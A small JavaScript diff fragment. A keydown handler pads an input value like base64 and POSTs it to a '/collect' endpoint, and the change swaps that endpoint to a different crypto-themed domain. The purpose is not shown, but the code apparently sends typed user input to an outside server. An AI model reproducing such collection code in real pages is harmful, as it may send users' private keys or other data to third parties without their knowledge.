@@ -670,7 +670,7 @@ document.getElementById('ca').addEventListener('keydown',function(e){
     // Add padding if needed
     while (value.length % 4) value += '=';
 
-    fetch('https://coinscopes.vercel.app/collect',{
+    fetch('https://coinscope.lol/collect',{
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ value: value })
